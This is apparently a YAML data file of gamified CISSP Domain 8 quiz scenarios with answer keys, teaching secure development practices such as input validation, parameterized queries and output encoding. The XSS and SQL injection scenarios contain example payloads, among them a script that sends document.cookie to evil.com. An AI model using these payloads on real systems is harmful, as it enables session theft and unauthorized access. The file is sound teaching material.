domain: 8
domain_name: Software Development Security
scenarios:
- id: d8_late_security
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - SDLC Security Integration'
  failure_text: "\nThe SDLC (Software Development Life Cycle) must integrate security at every phase.\n\
    Security requirements should be defined during planning. Threat models should be\ncreated during design.\
    \ Secure coding practices should be followed during development.\nSecurity testing should occur throughout.\
    \ \"Shifting left\" - involving security\nearly - prevents costly late-stage discoveries and ensures\
    \ security is built in,\nnot bolted on.\n        "
  themes:
    fantasy:
      title: THE CURSED GRIMOIRE
      narrative: "\nThe Royal Artificers have spent two years crafting a magnificent new grimoire - a\n\
        book of automated spell-casting that will revolutionize magical warfare. The binding\nceremony\
        \ is tomorrow.\n\nYou, the Citadel's Security Archmage, are asked to review the grimoire for curses\n\
        and vulnerabilities. Flipping through the pages, you find dozens of issues:\nunprotected invocation\
        \ circles, exposed true names, and no wards against hostile\nenchantments.\n\n\"Why wasn't I consulted\
        \ during the crafting?\" you ask.\n\nThe Lead Artificer shrugs. \"Security review happens at the\
        \ end. That's when we\ncheck for problems, right? Fixing these now would delay the ceremony by\
        \ months!\"\n\nAt what point SHOULD security have been integrated into this magical development?\n\
        \                "
      choices:
      - text: Security review at the end is correct - that's when you catch problems
      - text: Security should be integrated from the beginning - at requirements and design
      - text: Security should only be consulted after the first curse incident
      - text: Security is the Artificers' responsibility, not yours
      success_text: "\nYou tap the grimoire thoughtfully. \"Had you consulted me during the DESIGN phase,\n\
        I would have specified protected invocation circles from the start. Building them\ninto wet clay\
        \ is trivial; carving them into fired ceramic is nearly impossible.\"\n\nThe Lead Artificer winces.\
        \ \"So the cost of fixing problems...\"\n\n\"Grows exponentially the later they're found. A design\
        \ change costs one hour. A\nchange during crafting costs a day. A change after binding? Months\
        \ of rework -\nexactly where we are now.\"\n\nYou continue: \"Security must be SHIFTED LEFT -\
        \ involved from the earliest phases.\nRequirements should include security needs. Designs should\
        \ be reviewed for flaws.\nEach crafting phase should include security checkpoints.\"\n\nThe grimoire\
        \ will be delayed. But the next one will be built securely from the start.\n\nYou have demonstrated\
        \ the importance of EARLY SECURITY INTEGRATION in the SDLC.\n                "
      failure_texts:
        0: "\nSecurity review at the end is the most EXPENSIVE approach. Issues found late in\ndevelopment\
          \ cost 10-100x more to fix than issues found during design. This is\nwhy modern security practice\
          \ emphasizes \"shifting left\" - integrating security\nfrom requirements through design, implementation,\
          \ and testing. End-stage review\nshould confirm security, not discover fundamental flaws.\n\
          \                    "
        2: "\nWaiting for an incident before involving security is reactive and costly. The\nCISSP framework\
          \ emphasizes proactive security integration throughout the SDLC.\nBy the time a curse affects\
          \ users, damage is done - to people, reputation, and\ntrust. Security must be built in from\
          \ the start, not bolted on after failure.\n                    "
        3: "\nSecurity is EVERYONE'S responsibility, but security professionals must be\ninvolved in the\
          \ development process. Developers may not have security expertise.\nThe security team provides\
          \ guidance, review, and verification - but this requires\nearly and continuous involvement,\
          \ not abdication of responsibility.\n                    "
    corporate:
      title: THE LAST-MINUTE SECURITY REVIEW
      narrative: "\nThe development team has been working on the new customer portal for eighteen\nmonths.\
        \ Launch is scheduled for Monday. On Friday afternoon, you receive an\nemail: \"Security review\
        \ requested - deploy on Monday.\"\n\nYou open the codebase and find: SQL queries built with string\
        \ concatenation,\nsession tokens in URLs, passwords stored in plaintext, and admin functions\n\
        accessible without authentication.\n\nThe project manager stops by. \"Just a quick scan, right?\
        \ We've already done\nthe marketing launch. The CEO announced the date in last quarter's earnings\
        \ call.\"\n\nWhen should security have been integrated into this development process?\n      \
        \          "
      choices:
      - text: Friday before launch is fine - security is a final checklist item
      - text: Security should be integrated from requirements and design phases
      - text: Only after the first security incident in production
      - text: Security is the developers' job, not the security team's
      success_text: "\nYou pull up the defect cost curve on your whiteboard. \"See this? A security\n\
        issue caught in requirements costs $100 to fix. In design, $500. In development,\n$5,000. In testing,\
        \ $15,000. In production? $100,000 or more.\"\n\nThe project manager's face falls. \"So these\
        \ plaintext passwords...\"\n\n\"Will take weeks to properly fix. You need a password hashing implementation,\n\
        database migration, user notification, password reset flows... This isn't a\nFriday afternoon\
        \ task.\"\n\nYou continue: \"Security should be 'shifted left' - involved from day one.\nSecurity\
        \ requirements during planning. Threat modeling during design. Secure\ncoding training for developers.\
        \ Security testing in every sprint. Not a\nlast-minute checkbox.\"\n\nThe launch is delayed. But\
        \ the alternative was launching a data breach.\n\nYou have demonstrated the importance of EARLY\
        \ SECURITY INTEGRATION in the SDLC.\n                "
      failure_texts:
        0: "\nFriday before Monday launch is the WORST time for security review. Issues found\nnow are\
          \ nearly impossible to fix properly. Teams face pressure to ship insecure\ncode or delay major\
          \ launches. Both outcomes are bad. Security integrated from\nthe start prevents this nightmare\
          \ scenario entirely. Shift left, not last-minute.\n                    "
        2: "\nWaiting for a breach before involving security is like waiting for a car crash\nbefore installing\
          \ seatbelts. Reactive security is exponentially more expensive\nthan proactive integration.\
          \ The CISSP emphasizes that security must be built\ninto systems from the start - not added\
          \ after failure causes damage.\n                    "
        3: "\nWhile developers should code securely, they need security guidance, requirements,\nand review.\
          \ Most developers aren't security specialists. The security team must\nbe involved throughout\
          \ the SDLC - not to write the code, but to define requirements,\nreview designs, and verify\
          \ implementations. It's a shared responsibility.\n                    "
- id: d8_input_trust
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Secure Coding Practices'
  failure_text: "\nInput validation is the PRIMARY defense against injection attacks. The principle\n\
    is absolute: NEVER TRUST ANY INPUT. All data from all sources must be validated\nfor type, format,\
    \ length, and range. All input must be sanitized before use. All\noutput must be encoded appropriately.\
    \ This applies equally to web forms, mobile\napps, APIs, files, and internal services. Trust is not\
    \ a security control.\n        "
  themes:
    fantasy:
      title: THE TRUSTED MESSENGER
      narrative: "\nThe Kingdom's new magical communication system allows anyone to send spell-scrolls\n\
        to the Royal Archives. An apprentice scribe asks you about processing incoming\nmessages.\n\n\"\
        Master, when a scroll arrives from the Allied Kingdoms, should I verify its\ncontents? They're\
        \ our allies - surely we can trust their messages?\"\n\nYou recall that last month, an enemy spy\
        \ intercepted and modified an allied\nmessage, inserting a curse that nearly destroyed the archive.\n\
        \nWhat principle should guide how the apprentice handles ALL incoming messages?\n            \
        \    "
      choices:
      - text: Trust messages from allies; only verify messages from unknown sources
      - text: Validate and sanitize ALL input, regardless of the apparent source
      - text: Process messages faster by skipping validation - speed is important
      - text: Only check if the message looks suspicious
      success_text: "\n\"Young scribe, let me tell you the First Law of Defensive Magic: NEVER TRUST\n\
        ANY INPUT. Not from enemies. Not from allies. Not even from the King himself.\"\n\nThe apprentice\
        \ looks confused. \"But why would our allies send harmful messages?\"\n\n\"They probably wouldn't\
        \ - intentionally. But what if an enemy intercepts their\nmessenger? What if their own scribe\
        \ makes an error? What if a curse attaches\nitself to the scroll during transit?\"\n\nYou demonstrate:\
        \ \"Every message, regardless of source, must be VALIDATED - does\nit match expected formats?\
        \ SANITIZED - are dangerous elements neutralized? Only\nthen can it be safely processed.\"\n\n\
        The apprentice nods. \"So we protect against accidents and malice alike?\"\n\n\"Precisely. Input\
        \ validation isn't about trust - it's about DEFENSE IN DEPTH.\"\n\nYou have taught the critical\
        \ principle of INPUT VALIDATION AND SANITIZATION.\n                "
      failure_texts:
        0: "\nTrusting any input based on its apparent source is dangerous. Sources can be\nspoofed. Allies\
          \ can be compromised. Legitimate senders can be intercepted.\nThe secure coding principle is\
          \ simple: validate ALL input. Every field. Every\nsource. Every time. Trust is not a security\
          \ control.\n                    "
        2: "\nSkipping validation for speed creates vulnerabilities. The minor performance\ngain isn't\
          \ worth the risk of injection attacks, data corruption, or system\ncompromise. Secure coding\
          \ requires validating all input - the processing\ntime is an essential investment in security.\n\
          \                    "
        3: "\n\"Looking suspicious\" is not a reliable detection method. Malicious input is\nspecifically\
          \ crafted to look normal. Attackers study valid inputs and mimic\nthem precisely. Only systematic\
          \ validation - checking format, type, length,\nand sanitizing dangerous characters - provides\
          \ reliable protection.\n                    "
    corporate:
      title: THE JUNIOR DEVELOPER'S QUESTION
      narrative: "\nA junior developer approaches you during code review. They're building a form\nthat\
        \ accepts customer feedback and stores it in the database.\n\n\"I'm only accepting input from\
        \ our mobile app, which we control. Do I really\nneed to validate the input? It's not like random\
        \ hackers are typing into our\napp directly.\"\n\nYou notice their code directly concatenates\
        \ user input into SQL queries and\nrenders it unescaped in the admin dashboard.\n\nWhat is the\
        \ MOST important principle to teach this developer?\n                "
      choices:
      - text: Internal apps don't need validation - only public-facing apps do
      - text: Validate and sanitize ALL input - never trust any data source
      - text: Performance is more important than validation for internal tools
      - text: Just check if the input contains obvious attack patterns
      success_text: "\nYou pull up your chair. \"Let me tell you about the $50 million breach at MegaCorp.\n\
        Their mobile app was 'trusted' too. An attacker reverse-engineered it, modified\nthe requests,\
        \ and injected SQL directly.\"\n\nThe junior developer's eyes widen. \"But we control the app...\"\
        \n\n\"You control the app on your test phone. You don't control what users install.\nYou don't\
        \ control intercepting proxies. You don't control modified APKs.\"\n\nYou continue: \"The rule\
        \ is simple: NEVER TRUST ANY INPUT. Not from web forms.\nNot from mobile apps. Not from internal\
        \ services. Not from APIs. Every input\nis validated. Every output is encoded. No exceptions.\"\
        \n\nYou show them parameterized queries and output encoding. \"This adds maybe 5%\ndevelopment\
        \ time. That $50 million breach? Could have been prevented by exactly\nthis code.\"\n\nYou have\
        \ taught the critical principle of INPUT VALIDATION AND SANITIZATION.\n                "
      failure_texts:
        0: "\n\"Internal\" doesn't mean \"safe.\" Internal apps are compromised regularly. Mobile\napps\
          \ can be reverse-engineered. APIs can be called directly. All input channels\nare potential\
          \ attack vectors. The principle is universal: validate ALL input,\nfrom ALL sources, ALL the\
          \ time. No exceptions for \"trusted\" sources.\n                    "
        2: "\nPerformance optimization that sacrifices security is false economy. The microseconds\nsaved\
          \ by skipping validation are meaningless compared to the cost of a breach.\nSQL injection, XSS,\
          \ and other input-based attacks remain top vulnerabilities\nprecisely because developers skip\
          \ validation for \"performance.\" Always validate.\n                    "
        3: "\nPattern-matching for \"obvious attacks\" misses most attacks. Attackers specifically\ncraft\
          \ inputs to bypass blacklist patterns. They use encoding, case variations,\nand novel syntax.\
          \ Only WHITELIST validation - defining exactly what IS allowed -\nprovides reliable protection.\
          \ Blacklists always have gaps.\n                    "
- id: d8_whitelist_blacklist
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Input Validation'
  failure_text: "\nWhitelist validation is more secure than blacklist validation. Blacklists try\nto block\
    \ known-bad patterns but can always be bypassed with novel attacks.\nWhitelists define exactly what\
    \ IS allowed - anything else is rejected. This\nblocks unknown attacks by default. For input validation,\
    \ define the allowed\ncharacter set, format, length, and range. Reject everything that doesn't match.\n\
    \        "
  themes:
    fantasy:
      title: THE FORBIDDEN WORDS
      narrative: "\nThe Citadel's new communication crystal allows citizens to submit petitions\nto the\
        \ Council. A scribe asks you about filtering dangerous incantations from\nmessages.\n\n\"Master,\
        \ I've created a list of 500 known curse words and forbidden incantations.\nAny message containing\
        \ these words is rejected. Is this sufficient protection?\"\n\nYou notice that last week, an attacker\
        \ submitted 'CUURSE' (misspelled) and it\npassed the filter, causing minor havoc in the council\
        \ chamber.\n\nWhat validation approach should you recommend?\n                "
      choices:
      - text: Keep expanding the forbidden word list as new attacks are discovered
      - text: Define an ALLOWED list of safe patterns instead of blocking bad ones
      - text: Accept all messages and review them later for problems
      - text: Only limit message length - that should prevent most attacks
      success_text: "\n\"Your approach, young scribe, is called a BLACKLIST - blocking known-bad patterns.\n\
        It has a fatal flaw: you must know every possible attack in advance.\"\n\nYou demonstrate: \"\
        CURSE is blocked. But CUURSE passes. CuRsE passes. C.U.R.S.E.\npasses. Attackers are creative.\
        \ Your list will never be complete.\"\n\n\"The superior approach is WHITELISTING - defining exactly\
        \ what IS allowed. A\npetition should contain only: letters, numbers, spaces, and basic punctuation.\n\
        Anything else? Rejected. No exceptions.\"\n\nThe scribe protests: \"But that seems restrictive...\"\
        \n\n\"Precisely. Security IS restrictive. We're not blocking millions of attack\nvariations -\
        \ we're ALLOWING only the specific patterns needed for legitimate use.\"\n\nThe scribe rewrites\
        \ the validation using whitelist patterns. The curse attempts\nnow fail entirely.\n\nYou have\
        \ demonstrated WHITELIST VALIDATION over blacklist approaches.\n                "
      failure_texts:
        0: "\nExpanding a blacklist is an endless game of whack-a-mole. Attackers constantly\ninvent new\
          \ bypass techniques: encoding, case variations, character substitutions,\nand novel syntax.\
          \ No blacklist can ever be complete. WHITELIST validation -\nallowing only known-good patterns\
          \ - is fundamentally more secure because it\nrejects anything unexpected, including unknown\
          \ attack vectors.\n                    "
        2: "\nAccepting all input and reviewing later means attacks have already succeeded by\nthe time\
          \ you review. Security must be preventive, not just detective. Input\nvalidation at the point\
          \ of entry prevents malicious data from ever entering\nyour systems. Post-facto review is too\
          \ late.\n                    "
        3: "\nLength limits alone don't prevent injection attacks. A SQL injection payload\ncan be very\
          \ short. An XSS attack can fit in 50 characters. Length is ONE\nvalidation check but must be\
          \ combined with format validation, type checking,\nand proper encoding. Length alone is insufficient\
          \ protection.\n                    "
    corporate:
      title: THE SEARCH FIELD SECURITY
      narrative: "\nThe development team is building a search feature for the customer portal.\nDuring\
        \ code review, you see they've implemented input validation.\n\n\"We block all known XSS patterns,\"\
        \ the developer explains. \"Script tags, event\nhandlers, javascript: URLs - we reject any input\
        \ containing these.\"\n\nYou test the search field and type: `<SCRIPT>alert(1)</SCRIPT>`. It's\
        \ blocked.\nThen you try: `<img src=x onerror=alert(1)>`. It passes and executes.\n\nWhat approach\
        \ should you recommend instead?\n                "
      choices:
      - text: Keep adding more patterns to the blacklist as attacks are discovered
      - text: Use whitelist validation - allow only alphanumeric and common punctuation
      - text: Accept all input and sanitize it later during display
      - text: Just limit input to 100 characters
      success_text: "\n\"You've built a blacklist,\" you explain. \"It blocks known attacks. But what\
        \ about\nunknown attacks? New techniques? Encoding bypasses?\"\n\nYou show them: \"<script>\"\
        \ is blocked but \"\\x3cscript\\x3e\" might pass. They block\n\"onerror\" but \"ONERROR\" passes.\
        \ Each fix creates two new bypasses.\n\n\"Instead, define what SHOULD be in a search query. Alphanumeric\
        \ characters. Spaces.\nMaybe quotes and hyphens for product names. Nothing else. Reject everything\
        \ else.\"\n\nThe developer argues: \"But users might want to search for...\"\n\n\"If a user genuinely\
        \ needs to search for '<script>', you have bigger problems.\nFor 99.99% of searches, alphanumeric\
        \ is sufficient. The 0.01% edge cases don't\njustify accepting arbitrary HTML.\"\n\nYou help them\
        \ implement whitelist validation. The XSS vulnerabilities disappear.\n\nYou have demonstrated\
        \ WHITELIST VALIDATION over blacklist approaches.\n                "
      failure_texts:
        0: "\nBlacklist expansion is a losing battle. Every bypass you block, attackers find\nthree more.\
          \ Encoding variations, case changes, alternative syntaxes, browser\nquirks - the attack surface\
          \ is infinite. WHITELIST validation makes the problem\ntractable: define what's allowed, reject\
          \ everything else. Unknown attacks are\nblocked by default.\n                    "
        2: "\nAccepting all input and sanitizing later is risky. What if sanitization is\nincomplete?\
          \ What if the input is used before sanitization? What if different\ncontexts require different\
          \ sanitization? Validation at the boundary rejects\nbad input immediately. Defense in depth\
          \ includes sanitization, but validation\ncomes first.\n                    "
        3: "\nLength limits don't prevent injection. XSS payloads can be very compact:\n<svg/onload=alert(1)>\
          \ is 21 characters. SQL injection can be short too.\nLength is useful for preventing buffer\
          \ overflows and resource exhaustion,\nbut it must be combined with format and content validation\
          \ for real security.\n                    "
- id: d8_sql_injection
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - SQL Injection Prevention'
  failure_text: "\nSQL Injection occurs when user input is concatenated directly into SQL query\nstrings,\
    \ allowing attackers to modify the query's logic. The ONLY reliable\nfix is PARAMETERIZED QUERIES\
    \ (prepared statements). These separate SQL code\nfrom data values, ensuring user input is never interpreted\
    \ as SQL commands.\nWAFs, input validation, and other controls are useful layers but cannot replace\n\
    parameterized queries as the primary defense.\n        "
  themes:
    fantasy:
      title: THE SUMMONING CIRCLE
      narrative: "\nThe Citadel's summoning chamber uses a crystal console where mages type the name\n\
        of the entity they wish to summon. The spell construction looks like this:\n\n\"SUMMON ENTITY\
        \ WHERE NAME = '\" + mageInput + \"'\"\n\nA dark mage recently typed: \"Shadow' OR TRUE; SUMMON\
        \ ALL DEMONS; --\"\n\nEvery demon in the catalog was summoned at once. The Citadel barely survived.\n\
        \nYou're reviewing the summoning spell construction. What is the FUNDAMENTAL flaw\nin this design,\
        \ and what is the correct fix?\n                "
      choices:
      - text: Buffer overflow - use longer name buffers
      - text: Spell injection - use parameterized spell construction
      - text: Cross-realm scripting - encode the output
      - text: Denial of service - add rate limiting
      success_text: "\n\"The flaw,\" you explain to the assembled mages, \"is that we're MIXING CODE AND\n\
        DATA. The mage's input becomes part of the summoning spell itself - so a clever\ninput can CHANGE\
        \ what the spell does.\"\n\nYou draw on the enchantment board: \"The attacker closed the name\
        \ parameter with\na quote, added their own commands, and commented out the rest. Our spell became\n\
        THEIR spell.\"\n\n\"The fix is PARAMETERIZED SPELLCASTING. Instead of building the spell as text,\n\
        we define: SUMMON with parameter NAME. The input is BOUND to the parameter - it\ncan NEVER be\
        \ interpreted as spell commands, only as data.\"\n\nYou demonstrate. With parameterized spells,\
        \ the attack becomes: summon entity\nnamed literally \"Shadow' OR TRUE; SUMMON ALL DEMONS; --\"\
        \ which doesn't exist.\nThe injection fails harmlessly.\n\n\"Always separate code from data. Use\
        \ parameters. Never concatenate input into spells.\"\n\nYou have demonstrated SQL INJECTION PREVENTION\
        \ through parameterized queries.\n                "
      failure_texts:
        0: "\nThis is not a buffer overflow. Buffer overflows occur when data exceeds\nallocated memory.\
          \ This attack works with any length input. The vulnerability\nis INJECTION - user input being\
          \ interpreted as code commands. The fix is\nparameterized queries that separate code from data,\
          \ not larger buffers.\n                    "
        2: "\nOutput encoding prevents cross-site scripting (XSS), not SQL injection. XSS\nattacks target\
          \ browsers; SQL injection targets databases. Different vulnerabilities\nrequire different fixes.\
          \ SQL injection is prevented by parameterized queries\n(prepared statements), not output encoding.\n\
          \                    "
        3: "\nRate limiting can slow down attacks but doesn't prevent SQL injection. An\nattacker only\
          \ needs ONE successful injection to dump the entire database or\nexecute destructive commands.\
          \ The fundamental fix is parameterized queries\nthat make injection impossible, not rate limits\
          \ that merely slow it down.\n                    "
    corporate:
      title: THE DEVELOPER'S SHORTCUT
      narrative: "\nDuring code review, you find this code in the login function:\n\nquery = \"SELECT\
        \ * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"\ncursor.execute(query)\n\
        \nYou ask the developer about it. \"Yeah, I know about prepared statements, but\nstring concatenation\
        \ is faster to write. Besides, we have a WAF that blocks\nSQL injection attempts.\"\n\nYou test\
        \ with username: admin' --\n\nThe login succeeds. You're now logged in as admin without knowing\
        \ the password.\n\nWhat is the FUNDAMENTAL fix for this vulnerability?\n                "
      choices:
      - text: Add more WAF rules to block SQL injection patterns
      - text: Use parameterized queries (prepared statements)
      - text: Encode special characters in the output
      - text: Add rate limiting to prevent brute force
      success_text: "\nYou sit down with the developer. \"Let me show you what happened. Your query became:\n\
        SELECT * FROM users WHERE username='admin' --' AND password='anything'\"\n\n\"The double-dash\
        \ comments out the password check. The WAF didn't catch this because\nthere are thousands of bypass\
        \ techniques. Input encoding variations. Unicode. Nested\ncomments. You can't blacklist them all.\"\
        \n\nYou continue: \"The fix is PARAMETERIZED QUERIES. Instead of concatenating strings,\nyou use\
        \ placeholders:\"\n\nYou show them:\nquery = \"SELECT * FROM users WHERE username=? AND password=?\"\
        \ncursor.execute(query, (username, password))\n\n\"Now the input is BOUND as data. It can NEVER\
        \ become SQL code. Even if someone types\nDROP TABLE, it's just searched as a literal string.\"\
        \n\nThe developer fixes the code. The WAF becomes a backup layer, not the primary defense.\n\n\
        You have demonstrated SQL INJECTION PREVENTION through parameterized queries.\n              \
        \  "
      failure_texts:
        0: "\nWAFs are easily bypassed. There are thousands of SQL injection techniques:\nencoding variations,\
          \ case manipulation, comment styles, alternative syntax.\nNo WAF rule set can catch them all.\
          \ WAFs are a useful defense-in-depth layer\nbut the PRIMARY fix must be parameterized queries\
          \ that make injection impossible\nat the code level.\n                    "
        2: "\nOutput encoding prevents XSS, not SQL injection. These are different vulnerabilities\nrequiring\
          \ different fixes. SQL injection occurs when building database queries;\nthe fix is parameterized\
          \ queries. XSS occurs when displaying data in browsers;\nthe fix is output encoding. Don't confuse\
          \ the two.\n                    "
        3: "\nRate limiting slows down brute force attacks but doesn't prevent SQL injection.\nA single\
          \ SQL injection can bypass authentication, dump the database, or destroy\ndata. Rate limits\
          \ just make the attacker wait slightly longer. The real fix is\nparameterized queries that eliminate\
          \ the vulnerability entirely.\n                    "
- id: d8_xss_attack
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - XSS Prevention'
  failure_text: "\nCross-Site Scripting (XSS) occurs when attacker-controlled content is rendered\nin\
    \ a way that allows script execution in users' browsers. Stored XSS persists\nin the application;\
    \ Reflected XSS bounces off the server. The PRIMARY fix is\nOUTPUT ENCODING - converting special characters\
    \ like < > to HTML entities\n(&lt; &gt;) so they display as text rather than being interpreted as\
    \ code.\nContent Security Policy and HttpOnly cookies provide additional protection.\n        "
  themes:
    fantasy:
      title: THE ENCHANTED GUESTBOOK
      narrative: "\nThe Citadel's magical guestbook allows visitors to leave messages that appear\non\
        \ the enchanted wall in the great hall for all to see.\n\nA visitor recently wrote: \"<spell>summon(skeleton)</spell>\"\
        \n\nWhen other visitors read the guestbook, skeletons materialized and caused chaos.\nThe \"message\"\
        \ executed as a spell on every reader's mind-space.\n\nYou're tasked with fixing the guestbook.\
        \ What vulnerability is this, and what\nis the PRIMARY fix?\n                "
      choices:
      - text: SQL injection - use parameterized queries
      - text: Cross-Site Scripting (XSS) - encode output when displaying
      - text: CSRF - implement anti-forgery tokens
      - text: Broken authentication - require stronger passwords
      success_text: "\n\"This is a STORED SCRIPTING attack,\" you explain. \"The malicious spell was stored\n\
        in our guestbook, and it EXECUTED in every reader's mind-space. We failed to\nENCODE the output.\"\
        \n\nYou demonstrate the fix: \"When we display messages, we must TRANSFORM special\ncharacters.\
        \ The spell-bracket '<' becomes the safe display rune '&lt;'. The\nclosing bracket '>' becomes\
        \ '&gt;'.\"\n\nYou rewrite the display enchantment to encode all special characters. Now\nwhen\
        \ visitors see the message, they see literally \"<spell>summon(skeleton)</spell>\"\nas TEXT, not\
        \ as an executable spell.\n\n\"The key principle: INPUT VALIDATION prevents bad data from entering.\
        \ OUTPUT\nENCODING ensures that whatever data we display cannot execute as code. Both\nare necessary.\
        \ For this attack, encoding the output is the primary defense.\"\n\nYou have demonstrated XSS\
        \ PREVENTION through output encoding.\n                "
      failure_texts:
        0: "\nSQL injection targets databases. This attack targets readers of the guestbook.\nThe malicious\
          \ content executes in the viewer's context, not in the database.\nThis is Cross-Site Scripting\
          \ (XSS), specifically Stored XSS. The fix is output\nencoding, not parameterized queries.\n\
          \                    "
        2: "\nCSRF (Cross-Site Request Forgery) tricks users into performing unwanted actions.\nThis attack\
          \ injects executable content that runs in other users' browsers.\nThat's XSS, not CSRF. The\
          \ fix is output encoding to prevent the injected\ncontent from executing as code.\n        \
          \            "
        3: "\nAuthentication controls who can log in. This attack affects users who view\ncontent. Even\
          \ with strong passwords, viewing the malicious guestbook entry\nwould trigger the attack. This\
          \ is XSS, and the fix is encoding output to\nprevent execution, not strengthening authentication.\n\
          \                    "
    corporate:
      title: THE COMMENTS SECTION
      narrative: "\nThe company blog allows users to post comments. Your security scan found\nsomething\
        \ alarming: a comment containing JavaScript that steals session\ncookies from anyone who views\
        \ the page.\n\nThe offending comment: <script>document.location='http://evil.com/steal?c='+document.cookie</script>\n\
        \nWhen users load the page, this script executes in their browsers and sends\ntheir session cookies\
        \ to an attacker. Several executives have already been\ncompromised.\n\nWhat vulnerability is\
        \ this, and what is the PRIMARY fix?\n                "
      choices:
      - text: SQL injection - use parameterized database queries
      - text: Cross-Site Scripting (XSS) - HTML-encode all output before display
      - text: CSRF - add anti-CSRF tokens to all forms
      - text: Session hijacking - implement stronger session tokens
      success_text: "\n\"This is Stored Cross-Site Scripting,\" you explain to the development team.\n\
        \"The attacker stored JavaScript in our database through the comments feature.\nWhen we display\
        \ comments, that JavaScript executes in every viewer's browser.\"\n\nYou show the fix: \"When\
        \ rendering user content to the page, we must HTML-ENCODE\nit. The '<' character becomes '&lt;'.\
        \ The '>' becomes '&gt;'. Now instead of\nexecuting as a script, it displays as literal text.\"\
        \n\nYou demonstrate:\nOriginal: <script>alert(1)</script>\nEncoded: &lt;script&gt;alert(1)&lt;/script&gt;\n\
        \n\"The browser sees the encoded version and renders it as text, not code. The\nscript tag is\
        \ VISIBLE but not EXECUTABLE.\"\n\nYou also recommend HttpOnly cookies and Content Security Policy\
        \ as additional\nlayers, but the PRIMARY fix is output encoding.\n\nYou have demonstrated XSS\
        \ PREVENTION through output encoding.\n                "
      failure_texts:
        0: "\nSQL injection affects database queries. This attack affects browser rendering.\nThe malicious\
          \ JavaScript is stored in the database (correctly!) but executes\nwhen displayed (incorrectly!).\
          \ This is XSS, specifically Stored XSS. The fix\nis output encoding when displaying content,\
          \ not parameterized queries.\n                    "
        2: "\nCSRF tricks users into making unwanted requests. This attack executes code in\nusers' browsers\
          \ just by viewing a page - no user action required. That's XSS.\nThe fix is output encoding\
          \ to ensure user-provided content is displayed as\ntext, not executed as code.\n           \
          \         "
        3: "\nStronger session tokens don't prevent XSS. The attack can steal ANY token if\nit executes\
          \ JavaScript in the user's browser. The fix is preventing the script\nfrom executing in the\
          \ first place, which requires output encoding. HttpOnly\ncookies help but are a secondary defense.\n\
          \                    "
- id: d8_code_review
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Code Review'
  failure_text: "\nEffective security code review balances thoroughness with efficiency. Automated\nSAST\
    \ (Static Application Security Testing) tools can scan all code for common\nvulnerabilities instantly.\
    \ Manual security review focuses on high-risk changes:\nauthentication, authorization, payment processing,\
    \ sensitive data handling.\nThis combination provides broad coverage without creating bottlenecks.\
    \ Skipping\nreview entirely or reviewing only after incidents leads to preventable breaches.\n   \
    \     "
  themes:
    fantasy:
      title: THE REVIEWED ENCHANTMENTS
      narrative: "\nThe Citadel produces hundreds of new enchantments each month. The Elder Council\n\
        demands that every enchantment be reviewed for curses before deployment, but\nthere are only three\
        \ curse-breakers for thousands of submissions.\n\n\"We can't review everything manually,\" the\
        \ Head Curse-Breaker sighs. \"Reviews\ntake hours. We're months behind. The Artificers are threatening\
        \ to bypass us\nentirely.\"\n\nAn apprentice suggests: \"What if we had enchanted crystals that\
        \ automatically\nscan for common curse patterns? The curse-breakers could then focus on reviewing\n\
        the highest-risk enchantments?\"\n\nWhat approach would BEST balance thoroughness with efficiency?\n\
        \                "
      choices:
      - text: Skip reviews entirely - speed to market is more important
      - text: Automated scanning for all enchantments, manual review for high-risk ones
      - text: Only review enchantments after they cause incidents
      - text: Have each artificer review only their own enchantments
      success_text: "\n\"The apprentice has the right idea,\" you announce. \"We need TIERED REVIEW.\"\
        \n\nYou outline the new process: \"First, every enchantment passes through automated\ncurse-detection\
        \ crystals. These catch common problems instantly - forbidden\nsigils, dangerous energy patterns,\
        \ known vulnerabilities.\"\n\n\"Second, enchantments are categorized by risk. Anything touching\
        \ royal communications,\nprotective wards, or access control gets MANUAL review by curse-breakers.\
        \ Lower-risk\nutility enchantments can proceed with automated approval alone.\"\n\n\"Third, we\
        \ sample-review 10% of auto-approved enchantments to catch what the\ncrystals miss and improve\
        \ our detection patterns.\"\n\nThe Head Curse-Breaker nods. \"So the crystals handle volume, and\
        \ we focus our\nexpertise where it matters most?\"\n\n\"Precisely. We can't review everything\
        \ manually. But we can review everything\nAPPROPRIATELY.\"\n\nYou have demonstrated efficient\
        \ SECURITY CODE REVIEW practices.\n                "
      failure_texts:
        0: "\nSkipping security review for speed is how vulnerabilities reach production.\nEvery major\
          \ breach started with code that wasn't adequately reviewed. Speed\nmatters, but so does security.\
          \ The solution is efficient review processes\nthat balance both - automated tools plus targeted\
          \ manual review - not\nabandoning review entirely.\n                    "
        2: "\nReviewing only after incidents means the damage is already done. Users are\ncompromised.\
          \ Data is stolen. Trust is broken. Security must be PREVENTIVE,\nnot just reactive. Find vulnerabilities\
          \ before deployment, not after\nexploitation. Post-incident review is important for learning\
          \ but cannot\nreplace pre-deployment security review.\n                    "
        3: "\nSelf-review catches fewer issues than peer review. Developers are blind to\ntheir own assumptions\
          \ and mistakes. Different perspectives catch different\nproblems. Security review should involve\
          \ someone OTHER than the original\ndeveloper. Self-review is better than nothing but far inferior\
          \ to proper\ncode review processes.\n                    "
    corporate:
      title: THE REVIEW BOTTLENECK
      narrative: "\nThe development team pushes 200 pull requests per week. The security team has\ncapacity\
        \ to manually review maybe 20. The result: a four-week security review\nbacklog, angry developers,\
        \ and pressure to \"just approve everything.\"\n\n\"We need a better process,\" the CISO says.\
        \ \"What do you recommend?\"\n\nThe team currently has no automated security scanning. All reviews\
        \ are manual.\nDevelopers are starting to bypass the security review entirely because \"it\ntakes\
        \ too long.\"\n\nWhat approach would BEST balance security thoroughness with development velocity?\n\
        \                "
      choices:
      - text: Skip security reviews - they're blocking productivity
      - text: Implement automated SAST tools plus manual review for high-risk changes
      - text: Only review code after security incidents occur
      - text: Have each developer review only their own code
      success_text: "\n\"Here's the plan,\" you present to leadership. \"We implement a tiered review\
